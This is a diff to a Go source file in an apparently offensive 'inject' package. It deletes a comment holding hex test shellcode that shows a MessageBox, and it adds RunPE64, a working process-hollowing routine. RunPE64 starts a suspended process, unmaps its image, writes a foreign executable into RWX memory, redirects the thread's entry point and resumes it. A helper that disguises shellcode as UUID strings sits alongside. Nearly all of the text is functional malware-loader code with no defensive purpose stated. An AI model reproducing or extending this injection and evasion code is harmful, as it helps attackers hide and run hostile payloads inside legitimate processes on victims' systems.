@@ -1,6 +1,9 @@
 package inject
 
 import (
+	"bytes"
+	"debug/pe"
+	"encoding/binary"
 	"encoding/hex"
 	"fmt"
 	"math/rand"
@@ -97,7 +100,7 @@ func SwapEndianness(array []byte, word_len int, pad_incomplete bool) []byte {
 	return result
 }
 
-// Test fc4881e4f0ffffffe8d0000000415141505251564831d265488b52603e488b52183e488b52203e488b72503e480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed5241513e488b52203e8b423c4801d03e8b80880000004885c0746f4801d0503e8b48183e448b40204901d0e35c48ffc93e418b34884801d64d31c94831c0ac41c1c90d4101c138e075f13e4c034c24084539d175d6583e448b40244901d0663e418b0c483e448b401c4901d03e418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a3e488b12e949ffffff5d49c7c1000000003e488d95fe0000003e4c8d850a0100004831c941ba45835607ffd54831c941baf0b5a256ffd568656c6c6f20776f726c64004d657373616765426f7800
+// ConvertToUUIDS - converts a hex payload to a slice of UUID strings.
 func ConvertToUUIDS(payload string) []string {
 
 	uuids := []string{}
@@ -126,4 +129,102 @@ func ConvertToUUIDS(payload string) []string {
 	}
 
 	return uuids
+}
+
+// findRelocSec
+func findRelocSec(va uint32, secs []*pe.Section) *pe.Section {
+	for _, sec := range secs {
+		if sec.VirtualAddress == va {
+			return sec
+		}
+	}
+	return nil
+}
+
+func RunPE64(payload []byte, target string, commandLine string) {
+
+	// Create suspended process.
+	_, _, PI, err := CreateProcessA(target, commandLine, 0, 0, 0, 0x00000004, 0, 0)
+
+	processHandle := uintptr(PI.Process)
+	threadHandle := uintptr(PI.Thread)
+
+	// Get context of thread.
+	ctx, err := GetThreadContext(threadHandle)
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	// Golang trick to get context.
+	Rdx := binary.LittleEndian.Uint64(ctx[136:])
+
+	// Get Base Address
+	data := make([]byte, 8)
+	_, err = ReadProcessMemory(processHandle, uintptr(Rdx+16), data, 8)
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	baseAddress := uintptr(binary.LittleEndian.Uint64(data))
+
+	// Get headers of payload
+	f, err := pe.NewFile(bytes.NewReader(payload))
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	optionalHeader, ok := f.OptionalHeader.(*pe.OptionalHeader64)
+	if !ok {
+		panic("OptionalHeader64 not found")
+	}
+
+	// Unmap current executable.
+	_, err = NtUnmapViewOfSection(processHandle, baseAddress)
+
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	// Allocate space for new executable.
+	newImageBase := VirtualAllocEx2(processHandle, baseAddress, (uintptr)(optionalHeader.SizeOfImage), 0x00002000|0x00001000, 0x40)
+
+	_, err = WriteProcessMemory2(processHandle, newImageBase, payload, optionalHeader.SizeOfHeaders)
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	// Write sections (.text, etc).
+	for _, section := range f.Sections {
+
+		sectionData, err := section.Data()
+		if err != nil {
+			panic(err)
+		}
+		_, err = WriteProcessMemory2(processHandle, newImageBase+(uintptr)(section.VirtualAddress), sectionData, section.Size)
+		if err != nil {
+			fmt.Println(err)
+		}
+	}
+
+	// Write new image base bytes.
+	newImageBytes := make([]byte, 8)
+	binary.LittleEndian.PutUint64(newImageBytes, uint64(newImageBase))
+	_, err = WriteProcessMemory2(processHandle, uintptr(Rdx+16), newImageBytes, 8)
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	// Set entry point to new entry point.
+	binary.LittleEndian.PutUint64(ctx[128:], uint64(newImageBase)+uint64(optionalHeader.AddressOfEntryPoint))
+
+	// Update thread context.
+	err = SetThreadContext(threadHandle, ctx)
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	err = ResumeThread(threadHandle)
+	if err != nil {
+		fmt.Println(err)
+	}
 }
